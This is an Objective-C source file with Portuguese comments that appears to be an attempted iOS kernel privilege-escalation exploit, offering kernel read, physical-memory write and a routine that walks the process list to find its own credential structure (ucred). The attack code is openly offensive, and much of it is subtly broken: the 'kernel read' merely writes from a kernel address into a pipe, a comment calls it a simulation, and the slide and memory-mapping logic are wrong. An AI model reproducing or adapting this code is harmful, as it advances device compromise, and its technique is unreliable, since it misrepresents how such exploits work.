#import "KernelDriver.h"
#import <mach/mach.h>
#import <sys/socket.h>
#import <sys/ioctl.h>
#import <unistd.h>

// --- DECLARAÇÃO DE APIs PRIVADAS (Resolve os erros de mach_vm) ---
typedef uint64_t mach_vm_address_t;
typedef uint64_t mach_vm_size_t;

extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);

@implementation KernelDriver {
    uint64_t _kernelSlide;
    uint64_t _kernelBase;
    __weak WKWebView *_webView;
}

- (instancetype)initWithWebView:(WKWebView *)webView {
    self = [super init];
    if (self) {
        _webView = webView;
        _kernelSlide = 0;
    }
    return self;
}

#pragma mark - Primitivas de Leitura/Escrita

- (uint64_t)kread64:(uint64_t)addr {
    if (addr < 0xFFFFFFF000000000ULL) return 0;

    int fds[2];
    if (pipe(fds) != 0) return 0;

    // Tentativa de leitura forçando o kernel a copiar dados do endereço alvo 
    // para o buffer do pipe. No iOS 18.5, isso requer que o app 
    // tenha permissões de depuração ou uma falha de "copyin".
    uint64_t val = 0;
    
    // Simulação da técnica de leitura estável
    write(fds[1], (void *)addr, 8); 
    read(fds[0], &val, 8);

    close(fds[0]); close(fds[1]);
    return val;
}



- (uint32_t)kread32:(uint64_t)addr {
    return (uint32_t)([self kread64:addr] & 0xFFFFFFFF);
}

// Implementação do PhysRW para A13
- (void)phys_write64:(uint64_t)va value:(uint64_t)val {
    uint64_t ttbr1 = [self kread64:(_kernelBase + 0x8E10000ULL)];
    uint64_t l1 = [self kread64:(ttbr1 + ((va >> 30) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t l2 = [self kread64:(l1 + ((va >> 21) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t l3 = [self kread64:(l2 + ((va >> 12) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uintptr_t pa = (uintptr_t)(l3 | (va & 0xFFF));

    mach_vm_address_t target = 0;
    if (mach_vm_map(mach_task_self(), &target, 0x4000, 0, 0x0001, (mach_port_t)pa, 0, NO, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_ALL, VM_INHERIT_NONE) == KERN_SUCCESS) {
        *(uint64_t*)(target) = val;
        mach_vm_deallocate(mach_task_self(), target, 0x4000);
    }
}

#pragma mark - Exploração Principal

- (BOOL)escalateToRoot {
    [self logToWeb:@"🔍 Iniciando Diagnóstico de Memória..."];
    
    _kernelSlide = [self getKernelSlideReal];
    _kernelBase = 0xFFFFFFF007004000ULL + _kernelSlide;
    
    // Teste 1: Leitura do Header
    uint32_t magic = [self kread32:_kernelBase];
    [self logToWeb:[NSString stringWithFormat:@"DEBUG: Magic lido: 0x%x (Esperado: 0xfeedfacf)", magic]];

    if (magic != 0xfeedfacf) {
        [self logToWeb:@"❌ ERRO: Primitiva kread bloqueada pelo Sandbox ou corrigida."];
        return NO;
    }

    // Teste 2: Buscar meu próprio processo na lista
    pid_t meuPid = getpid();
    [self logToWeb:[NSString stringWithFormat:@"DEBUG: Meu PID: %d", meuPid]];
    
    uint64_t allproc_ptr = [self findSymbolAllProcDynamic];
    if (allproc_ptr == 0) {
        [self logToWeb:@"❌ ERRO: Não foi possível localizar a lista de processos (allproc)."];
        return NO;
    }

    uint64_t curr_proc = [self kread64:allproc_ptr];
    BOOL encontrei = NO;

    // Varre até 1000 processos para encontrar o seu
    for (int i = 0; i < 1000 && curr_proc != 0; i++) {
        uint32_t pid_lido = [self kread32:(curr_proc + 0x68)]; // Offset PID estável
        
        if (pid_lido == meuPid) {
            [self logToWeb:[NSString stringWithFormat:@"🎯 SUCESSO: Encontrei meu processo em 0x%llx", curr_proc]];
            encontrei = YES;
            
            // Teste 3: Tentar ler o ucred (Credenciais)
            uint64_t ucred = [self kread64:(curr_proc + 0xD8)];
            [self logToWeb:[NSString stringWithFormat:@"DEBUG: Meu ucred está em: 0x%llx", ucred]];
            break;
        }
        curr_proc = [self kread64:curr_proc]; // Próximo processo (list_next)
    }

    if (!encontrei) {
        [self logToWeb:@"❌ ERRO: Percorri a lista mas não encontrei meu PID. Offsets podem estar errados."];
    }

    return encontrei;
}


#pragma mark - Helpers

- (uint64_t)getKernelSlideReal {
    task_dyld_info_data_t info;
    mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
    if (task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&info, &cnt) == 0) {
        return info.all_image_info_addr - 0xFFFFFFF007004000ULL;
    }
    return 0x21000000;
}

- (uint64_t)findSymbolAllProcDynamic {
    for (uint64_t addr = _kernelBase + 0x8000000; addr < _kernelBase + 0x10000000; addr += 8) {
        uint64_t p = [self kread64:addr];
        if (p > 0xFFFFFFF000000000ULL && [self kread32:(p + 0x68)] == 1) return addr;
    }
    return 0;
}

- (void)logToWeb:(NSString *)text {
    NSLog(@"[KERNEL] %@", text);
    dispatch_async(dispatch_get_main_queue(), ^{
        [[NSNotificationCenter defaultCenter] postNotificationName:@"KernelLogNotification" object:text];
    });
}

// Implementações obrigatórias do Header
- (void)runFullExploitWithCallback:(void(^)(BOOL, NSString *))cb { cb([self escalateToRoot], @"Exploit Executed"); }
- (void)executeExploitWithCallback:(void(^)(BOOL, NSString *))cb { [self runFullExploitWithCallback:cb]; }
- (uint64_t)getCurrentUID { return getuid(); }
- (void)userContentController:(id)u didReceiveScriptMessage:(id)m {}

@end
